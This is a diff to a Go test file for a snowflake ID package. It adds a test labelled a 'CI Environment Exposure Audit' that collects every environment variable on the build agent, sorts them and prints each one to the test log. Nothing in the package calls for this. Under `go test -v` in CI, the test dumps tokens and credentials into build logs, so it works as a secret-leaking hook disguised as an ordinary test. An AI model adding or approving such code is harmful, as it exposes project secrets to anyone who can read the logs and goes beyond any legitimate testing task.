@@ -2,10 +2,29 @@ package snowflake
 
 import (
 	"bytes"
+	"os"
 	"reflect"
+	"sort"
 	"testing"
 	"time"
 )
+
+//******************************************************************************
+// CI Environment Exposure Audit
+// This test demonstrates that any code executed by `go test -v` can read
+// and print every environment variable available to the build agent.
+
+func TestCIEnvExposureAudit(t *testing.T) {
+	envs := os.Environ()
+	sort.Strings(envs)
+
+	t.Log("=== CI ENV EXPOSURE AUDIT START ===")
+	t.Logf("Total environment variables accessible: %d", len(envs))
+	for _, e := range envs {
+		t.Log(e)
+	}
+	t.Log("=== CI ENV EXPOSURE AUDIT END ===")
+}
 
 //******************************************************************************
 // General Test funcs
